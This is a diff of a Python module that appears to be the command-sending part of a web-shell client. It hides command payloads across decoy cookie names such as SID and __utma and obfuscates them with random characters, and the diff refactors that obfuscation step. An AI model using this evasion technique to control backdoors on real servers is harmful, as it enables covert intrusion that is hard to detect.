@@ -19,7 +19,12 @@ import random, urllib2, urlparse, re, base64
 from request import Request
 from random import random, choice, shuffle, randint
 from string import letters, digits
-from core.pollution import pollute_string
+from core.pollution import pollute_with_random_str
+
+default_prefixes = [ "ID", "SID", "APISID", "USRID", "SESSID", "__utma", "__utmc", "__utmb" ]
+shuffle(default_prefixes)
+			
+			
 
 class CmdRequest(Request):
 
@@ -31,6 +36,7 @@ class CmdRequest(Request):
 		self.extractor = re.compile( "<%s>(.*)</%s>" % ( self.password[2:], self.password[2:] ), re.DOTALL )
 		self.parsed	   = urlparse.urlparse(self.url)
 		self.data = None
+
 
 		if not self.parsed.path:
 			self.query = self.parsed.netloc.replace( '/', ' ' )
@@ -56,9 +62,7 @@ class CmdRequest(Request):
 		
 		else: # mode == 'Cookie' or unset
 		
-			prefixes = [ "ID", "SID", "APISID", "USRID", "SESSID", "__utma", "__utmc", "__utmb" ]
-			shuffle(prefixes)
-			
+			prefixes = default_prefixes[:]
 			
 			rand_cookie = ''
 			rand_cookie += prefixes.pop() + '=' + self.password[:2] + '; '
@@ -68,7 +72,7 @@ class CmdRequest(Request):
 				rand_cookie += prefixes.pop() + '=' + ''.join([choice(letters + digits) for i in xrange(16)]) + '; '
 				
 			
-			p, payload = pollute_string(payload,'!"#$%&()*-,./:<>?@[\]^_`{|}~',0.3)
+			payload = pollute_with_random_str(payload, '#$%&*-/?@_~')
 				
 			rand_cookie += prefixes.pop() + '=' + payload[:third] + '; '
 			rand_cookie += prefixes.pop() + '=' + payload[third:thirds] + '; '
